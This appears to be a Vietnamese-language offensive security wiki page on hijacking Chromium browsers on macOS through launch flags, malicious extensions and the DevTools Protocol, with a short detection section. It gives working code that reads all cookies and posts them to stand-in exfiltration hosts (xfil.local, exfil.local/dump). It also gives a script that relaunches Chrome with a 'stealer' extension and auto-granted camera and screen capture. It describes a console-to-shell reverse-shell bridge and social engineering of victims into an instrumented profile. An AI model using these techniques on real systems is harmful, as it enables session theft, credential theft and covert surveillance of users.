# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Các trình duyệt dựa trên Chromium như Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi và Opera đều sử dụng chung các command-line switch, tệp tùy chọn và giao diện tự động hóa DevTools. Trên macOS, bất kỳ người dùng nào có quyền truy cập GUI đều có thể chấm dứt phiên trình duyệt đang chạy rồi mở lại với các flag, extension hoặc endpoint DevTools tùy ý, chạy với các entitlement của mục tiêu.

#### Khởi chạy Chromium với flag tùy chỉnh trên macOS

macOS chỉ duy trì một phiên bản UI cho mỗi Chromium profile, vì vậy việc instrument thường cần force-close trình duyệt (ví dụ: `osascript -e 'tell application "Google Chrome" to quit'`). Kẻ tấn công thường khởi chạy lại bằng `open -na "Google Chrome" --args <flags>` để inject đối số mà không sửa app bundle. Đặt lệnh này bên trong LaunchAgent của người dùng (`~/Library/LaunchAgents/*.plist`) hoặc login hook sẽ đảm bảo trình duyệt đã bị can thiệp được khởi chạy lại sau khi reboot/logoff.

#### Flag `--load-extension`

Flag `--load-extension` tự động tải các extension chưa đóng gói (các đường dẫn phân tách bằng dấu phẩy). Kết hợp flag này với `--disable-extensions-except` để chặn các extension hợp lệ và chỉ cho payload của bạn chạy. Extension độc hại có thể yêu cầu các quyền có tác động lớn như `debugger`, `webRequest` và `cookies` để pivot vào giao thức DevTools, sửa header CSP, hạ cấp HTTPS hoặc exfiltrate dữ liệu phiên ngay khi trình duyệt khởi chạy.<sup>[[4]](#references)</sup>

#### Flag `--remote-debugging-port` / `--remote-debugging-pipe`

Các switch này cung cấp Chrome DevTools Protocol (CDP) qua TCP hoặc pipe để công cụ bên ngoài điều khiển trình duyệt. Google ghi nhận việc infostealer lạm dụng rộng rãi giao diện này và, bắt đầu từ Chrome 136 (tháng 3 năm 2025), các switch sẽ bị bỏ qua đối với profile mặc định, trừ khi trình duyệt được khởi chạy với `--user-data-dir` không theo mặc định. Điều này thực thi App-Bound Encryption trên các profile thực, nhưng kẻ tấn công vẫn có thể tạo profile mới, dụ nạn nhân xác thực trong profile đó (phishing/hỗ trợ phân loại sự cố), rồi thu thập cookie, token, trạng thái tin cậy thiết bị hoặc đăng ký WebAuthn qua CDP.<sup>[[5]](#references)</sup>

#### Flag `--user-data-dir`

Flag này chuyển toàn bộ browser profile (History, Cookies, Login Data, tệp Preferences, v.v.) sang một đường dẫn do kẻ tấn công kiểm soát. Flag này là bắt buộc khi kết hợp các bản Chrome hiện đại với `--remote-debugging-port`, đồng thời giữ profile đã bị can thiệp tách biệt để bạn có thể thêm sẵn các tệp `Preferences` hoặc `Secure Preferences` nhằm tắt lời nhắc bảo mật, tự động cài extension và thay đổi các scheme mặc định.

#### Flag `--use-fake-ui-for-media-stream`

Switch này bỏ qua lời nhắc cấp quyền camera/mic để mọi trang gọi `getUserMedia` đều được cấp quyền ngay lập tức. Kết hợp với các flag như `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` hoặc lệnh CDP `Browser.grantPermissions` để âm thầm ghi âm/ghi hình, chia sẻ màn hình hoặc vượt qua kiểm tra quyền WebRTC mà không cần tương tác của người dùng.<sup>[[4]](#references)</sup>

## Các mô hình phân phối và khởi chạy lại từng được ghi nhận

Lạm dụng CDP thường là một giai đoạn **post-exploitation**, thay vì payload ban đầu. Một chiến dịch macOS gần đây nhắm vào nhà phát triển đã sử dụng pha build **`Run Script`** bị cài mã độc (`PBXShellScriptBuildPhase`), khiến mã chỉ chạy khi nạn nhân **build** project, chứ không phải khi họ chỉ clone hoặc mở project. Sau lần thực thi đầu tiên đó, malware còn lây nhiễm các cây `.xcodeproj` khác, thêm Git `pre-commit` hook độc hại và tìm kiếm thêm project Xcode trong các kho lưu trữ ZIP.<sup>[[3]](#references)</sup>

Điều này quan trọng với việc lạm dụng Chromium vì kẻ tấn công không cần vá chính binary của trình duyệt. Thay vào đó, một stager ngắn hạn trong build phase / `osascript` có thể cài đặt **browser wrapper** (LaunchAgent, login item, mục Dock, trình khởi chạy ứng dụng đã bị cài trojan, v.v.) để mở lại trình duyệt hợp lệ với các flag do kẻ tấn công kiểm soát mỗi khi người dùng khởi chạy trình duyệt.<sup>[[3]](#references)</sup>

> [!TIP]
> Trên endpoint của nhà phát triển, hãy kiểm tra các tệp `.pbxproj`, `.git/hooks/pre-commit` và ZIP chứa `.xcodeproj` để tìm `curl`, `osascript`, `xxd`, `base64` lồng nhau hoặc logic khởi chạy lại Chrome bất thường.

## Lạm dụng Remote Debugging và DevTools Protocol

Sau khi Chrome được khởi chạy lại với `--user-data-dir` riêng và `--remote-debugging-port`, bạn có thể kết nối qua CDP (ví dụ: bằng `chrome-remote-interface`, `puppeteer` hoặc `playwright`) và tự động hóa các quy trình có đặc quyền cao:

- **Đánh cắp cookie/phiên:** `Network.getAllCookies` và `Storage.getCookies` trả về cả giá trị HttpOnly ngay cả khi App-Bound Encryption thường chặn truy cập hệ thống tệp, vì CDP yêu cầu trình duyệt đang chạy giải mã chúng.
- **Can thiệp quyền:** `Browser.grantPermissions` và `Emulation.setGeolocationOverride` cho phép bỏ qua lời nhắc camera/mic (đặc biệt khi kết hợp với `--use-fake-ui-for-media-stream`) hoặc giả mạo các kiểm tra bảo mật dựa trên vị trí.
- **Inject keystroke/script:** `Runtime.evaluate` thực thi JavaScript tùy ý bên trong tab đang hoạt động, cho phép lấy cắp thông tin xác thực, chỉnh sửa DOM hoặc inject beacon duy trì quyền truy cập qua các lần điều hướng.<sup>[[1]](#references)</sup>
- **Exfiltration trực tiếp:** `Network.webRequestWillBeSentExtraInfo` và `Fetch.enable` chặn các request/response đã xác thực theo thời gian thực mà không cần động đến các artifact trên đĩa.

```javascript
import CDP from 'chrome-remote-interface';

(async () => {
  const client = await CDP({host: '127.0.0.1', port: 9222});
  const {Network, Runtime} = client;
  await Network.enable();
  const {cookies} = await Network.getAllCookies();
  console.log(cookies.map(c => `${c.domain}:${c.name}`));
  await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
  await client.close();
})();
```

Vì Chrome 136 chặn CDP trên profile mặc định, việc sao chép thư mục `~/Library/Application Support/Google/Chrome` hiện có của nạn nhân sang đường dẫn staging không còn giúp lấy cookie đã giải mã. Thay vào đó, hãy dùng social engineering để dụ người dùng xác thực trong profile đã instrument (ví dụ: phiên hỗ trợ “tận tình”) hoặc thu thập token MFA đang truyền qua các network hook do CDP điều khiển.<sup>[[5]](#references)</sup>

### Chuỗi backdoor CDP kiểu XCSSET

Một mô hình malware thực tế là:

1. Khởi động lại implant hoặc wrapper ở userland mỗi khi Chrome được mở.
2. Chạy trình duyệt hợp pháp với `--remote-debugging-port=<port>` và, trên Chrome 136+, thường đi kèm `--user-data-dir=<dir>` không phải mặc định.
3. Khởi chạy helper kết nối với CDP WebSocket cục bộ và đăng ký hook chạy trước document bằng `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Helper đó có thể inject JavaScript **trước khi** mã của trang web chạy; đây là cách lý tưởng để hook `window.fetch`, `XMLHttpRequest`, wallet provider hoặc các luồng autofill mà không cần sửa file trên ổ đĩa.<sup>[[3]](#references)</sup>

```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
  source: `
    const oldFetch = window.fetch;
    window.fetch = async (...args) => {
      console.log('__HT__' + JSON.stringify(args[0]));
      return oldFetch(...args);
    };
  `
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```

Một biến thể mạnh hơn biến browser thành **cầu nối lệnh trên host**: JavaScript được inject phát ra `console.log` có gắn dấu phân cách, helper cục bộ theo dõi `Runtime.consoleAPICalled`, loại bỏ dấu đánh dấu, thực thi phần còn lại thông qua shell trên host (ví dụ `exec.Command` của Go), rồi trả stdout/stderr qua WebSocket của attacker. Cách này nâng cấp việc thực thi script ở cấp tab thành reverse shell hầu như không để lại file.<sup>[[3]](#references)</sup>

## Injection qua Extension bằng Debugger API

Nghiên cứu năm 2023 "Chrowned by an Extension" cho thấy một extension độc hại sử dụng API `chrome.debugger` có thể attach vào bất kỳ tab nào và có được các quyền DevTools tương tự `--remote-debugging-port`.<sup>[[6]](#references)</sup> Điều này phá vỡ các giả định cách ly ban đầu (extension hoạt động trong context riêng) và cho phép:

- Đánh cắp cookie và thông tin đăng nhập một cách âm thầm bằng `Network.getAllCookies`/`Fetch.getResponseBody`.
- Thay đổi quyền của site (camera, microphone, geolocation) và bypass màn hình cảnh báo bảo mật, cho phép các trang phishing giả mạo hộp thoại của Chrome.
- Can thiệp trên đường truyền vào cảnh báo TLS, lượt tải xuống hoặc lời nhắc WebAuthn bằng cách điều khiển `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` hoặc `Security.handleCertificateError` theo chương trình.

Load extension bằng `--load-extension`/`--disable-extensions-except` để không cần người dùng tương tác. Một background script tối giản weaponize API này như sau:

```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
  if (info.status !== 'complete') return;
  chrome.debugger.attach({tabId}, '1.3', () => {
    chrome.debugger.sendCommand({tabId}, 'Network.enable');
    chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
      fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
    });
  });
});
```

Tiện ích mở rộng cũng có thể đăng ký nhận các sự kiện `Debugger.paused` để đọc các biến JavaScript, vá các script nội tuyến hoặc đặt breakpoint tùy chỉnh vẫn tồn tại sau khi điều hướng. Vì mọi thứ chạy trong phiên GUI của người dùng, Gatekeeper và TCC không được kích hoạt, khiến kỹ thuật này trở nên lý tưởng cho malware đã thực thi được trong ngữ cảnh người dùng.<sup>[[6]](#references)</sup>

## Phát hiện & săn tìm

- Cảnh báo khi trình duyệt Chromium được khởi chạy với `--remote-debugging-port`, `--remote-debugging-pipe` hoặc `--user-data-dir` đáng ngờ, đặc biệt khi tiến trình cha là `bash`, `sh`, `osascript`, `xcodebuild` hoặc một trợ giúp LaunchAgent.
- Tìm các chuỗi ngắn trong đó một trợ giúp mở WebSocket CDP cục bộ, đăng ký `Page.addScriptToEvaluateOnNewDocument`, rồi tạo kết nối WebSocket/HTTPS đi ra tồn tại lâu dài.
- Săn tìm các cầu nối từ console đến shell bằng cách đối chiếu hoạt động `Runtime.consoleAPICalled` của trình duyệt với các shell con hoặc tiến trình trợ giúp thực thi lệnh do kẻ tấn công cung cấp.
- Trên máy Mac dành cho nhà phát triển, kiểm tra các mục `PBXShellScriptBuildPhase` trong `.pbxproj`, hook Git `pre-commit`, trình khởi chạy lại Dock/mục đăng nhập và các dự án Xcode nằm trong ZIP để phát hiện việc cài đặt trình bao bọc trình duyệt.

```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```

### Công cụ

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Tự động khởi chạy Chromium với các extension chứa payload và cung cấp các hook CDP tương tác.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Công cụ tương tự, tập trung vào việc chặn lưu lượng và instrument trình duyệt cho các operator trên macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Thư viện Node.js dùng để tạo script lấy dữ liệu từ Chrome DevTools Protocol (cookie, DOM, quyền) khi một instance chạy với `--remote-debugging-port` đang hoạt động.

### Ví dụ

```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
  --user-data-dir="$TMPDIR/chrome-privesc" \
  --remote-debugging-port=9222 \
  --load-extension="$PWD/stealer" \
  --disable-extensions-except="$PWD/stealer" \
  --use-fake-ui-for-media-stream \
  --auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```

Tìm thêm ví dụ trong các liên kết công cụ.

## References

- [1] [Chrome DevTools Protocol - miền Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - miền Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Sát thủ Xcode trở lại: Phân tích chuyên sâu phiên bản XCSSET mới nhất - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) trên X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Thay đổi các tùy chọn chuyển đổi gỡ lỗi từ xa để tăng cường bảo mật - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Bị một Extension chiếm quyền: Lạm dụng Chrome DevTools Protocol thông qua Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)
{{#include ../../../banners/hacktricks-training.md}}
